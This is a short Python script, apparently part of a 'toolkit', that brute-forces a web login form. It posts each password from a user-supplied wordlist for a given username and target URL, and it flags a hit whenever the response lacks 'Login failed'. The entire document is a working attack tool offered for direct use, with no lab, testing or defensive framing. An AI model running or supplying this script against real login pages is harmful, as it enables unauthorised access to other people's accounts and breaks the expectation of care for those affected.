import requests

def brute_force(url, username, password_file):
    with open(password_file, "r") as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        
        if "Login failed" not in response.text:
            print(f"[+] Password found: {password}")
            return
        else:
            print(f"[-] Failed with: {password}")

if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    username = input("Enter username: ")
    password_file = input("Enter path to password list: ")
    brute_force(target_url, username, password_file)
    # python toolkit.py
    
